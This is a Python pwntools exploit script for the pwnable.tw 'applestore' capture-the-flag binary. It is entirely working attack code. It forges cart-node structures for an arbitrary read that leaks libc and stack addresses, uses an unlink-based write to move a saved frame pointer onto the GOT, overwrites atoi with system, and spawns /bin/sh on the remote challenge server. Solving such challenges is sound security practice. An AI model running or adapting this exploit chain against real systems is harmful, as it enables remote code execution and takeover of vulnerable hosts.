#!/usr/bin/env python3
from pwn import *
import collections

DUMMY = 0xdeadbeef
DWORD = 4
SAVED_EBP = DWORD
SAVED_RET = DWORD

elf = ELF("./applestore_patched")
libc = ELF("./given/libc_32.so.6")
ld = ELF("./ld-2.23.so")

def knapsack(target, items):
    dp = [[] for _ in range(target+1)]
    for item in items:
        dp[item] = [item]
    for i in range(max(items), target+1):
        for item in items:
            if dp[i - item]:
                dp[i] = dp[i - item] + [item]
                break
    return collections.Counter(dp[target])

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10104)
    else:
        p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
        if args.D:
            gdb.attach(p,  """
                # handler()'s return, not part of the exloit
                b *0x8048c87
            """)
    return p

def add_to_cart(product_id, p):
    p.recvuntil(b"> ")
    p.sendline(b"2")

    p.recvuntil(b"Device Number>")
    p.sendline(str(product_id).encode())

def remove_from_cart(product_id, p):
    p.recvuntil(b"> ")
    p.sendline(b"3")

    p.recvuntil(b"Item Number>")
    p.sendline(str(product_id).encode())

def checkout(p):
    p.recvuntil(b"> ")
    p.sendline(b"5")

    p.recvuntil(b"Let me check your cart. ok? (y/n)")
    p.sendline(b"y")

def buy_iphone8(p):
    idx = 0
    for _ in range(19):
        add_to_cart(1, p) # $199
        idx += 1
    for _ in range(1):
        add_to_cart(4, p) # $399
        idx += 1
    for _ in range(6):
        add_to_cart(3, p) # $499
        idx += 1
    checkout(p)
    idx += 1

    return idx


class AppleProduct:
    def __init__(self, name, price, next_product, prev_product):
        self.name = name
        self.price = price
        self.next = next_product
        self.back = prev_product

    def pack(self):
        return p32(self.name) + p32(self.price) + p32(self.next) + p32(self.back)


def arbit_read(addr, iphone8_idx, p):
    """
    We can only leak after we bought iphone 8.
    """
    p.recvuntil(b"> ")
    p.sendline(b"4")

    p.recvuntil(b"Let me check your cart. ok? (y/n)")
    leak_product = AppleProduct(addr, 1, 0, 0)
    p.sendline(b"y\x00" + leak_product.pack())

    p.recvuntil(b"==== Cart ====")
    p.recvuntil(str(iphone8_idx).encode() + b": ")
    leaked_bytes = p.recvline()
    return leaked_bytes

def constrained_arbit_write(addr, value, iphone8_idx, p):
    """
    One-time arbitrary write
    """
    # we have only two digit to write
    assert(iphone8_idx < 100)
    p.recvuntil(b"> ")
    p.sendline(b"3\x00")

    p.recvuntil(b"Item Number>")
    print("Overwritting {} with {}".format(hex(addr), hex(value)))
    payload = str(iphone8_idx).encode().ljust(2, b"\x00")
    payload += AppleProduct(0x0, 0x0, addr - DWORD*3, value).pack()
    p.sendline(payload)


def exploit():
    p = conn()

    # info: objdump
    got_puts = 0x804b028
    got_atoi = 0x804b040
    data_cart = 0x804b068
    data_cart_next = data_cart + DWORD + DWORD

    iphone8_idx = buy_iphone8(p)

    # leak libc
    info_leaked = arbit_read(elf.got['puts'], iphone8_idx, p)
    libc_puts = u32(info_leaked[:4])
    print("libc puts:", hex(libc_puts))
    libc.address = libc_puts - libc.symbols['puts']

    # leak stack
    for i in range(iphone8_idx-1):
        remove_from_cart(1, p)
        iphone8_idx -= 1
    info_leaked = arbit_read(data_cart_next, iphone8_idx, p)
    stack_product_struct = u32(info_leaked[:4])
    stack_func_delete_buf = stack_product_struct - 0x2
    print("stack buf:", hex(stack_product_struct))

    # overwrite return address
    stack_func_delete_ebp = stack_func_delete_buf + 0x22
    stack_func_handler_buf = stack_func_delete_ebp + SAVED_EBP + SAVED_RET + (0x38 - 0x22)
    stack_func_handler_ebp = stack_func_delete_ebp + SAVED_EBP + SAVED_RET + 0x38

    # [HARD] change saved ebp so that ebp in the handler() will be on the GOT
    #
    constrained_arbit_write(stack_func_delete_ebp,
                            elf.got["atoi"] - (stack_func_handler_buf - stack_func_handler_ebp),
                            iphone8_idx,
                            p)
    p.recvuntil(b"> ")
    p.sendline(p32(libc.symbols["system"]) + b";/bin/sh;")

    p.interactive()


if __name__ == "__main__":
    counter = knapsack(0x1c06, [199, 299, 399, 499])
    print(counter)
    exploit()
